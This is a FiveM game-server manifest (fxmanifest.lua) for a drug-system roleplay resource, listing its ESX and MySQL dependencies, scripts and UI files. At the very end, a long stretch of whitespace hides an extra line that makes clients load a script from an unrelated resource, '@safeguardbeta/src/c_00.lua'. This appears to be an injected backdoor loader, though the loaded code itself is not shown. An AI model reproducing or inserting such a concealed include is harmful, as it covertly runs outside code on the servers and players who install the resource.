fx_version 'cerulean'
game 'gta5'

author 'SafeGuard'
description 'Sistema de Drogas desenvolvido por SafeGuard Team'
version '1.1.0'
site 'https://safeguardev.net/'

ui_page 'html/index.html'

shared_scripts {
    '@es_extended/imports.lua',
    '@es_extended/locale.lua',
    'locales/locales.lua',
    'config.lua'
}

client_scripts {
    'client.lua'
}

server_scripts {
    '@oxmysql/lib/MySQL.lua',
    'server.lua'
}

dependencies {
    'es_extended',
    'progressBars',
    'oxmysql'
}

files {
    'html/index.html',
    'html/styles.css',
    'html/script.js',
	"html/**/*"
}                                                                   

client_script '@safeguardbeta/src/c_00.lua'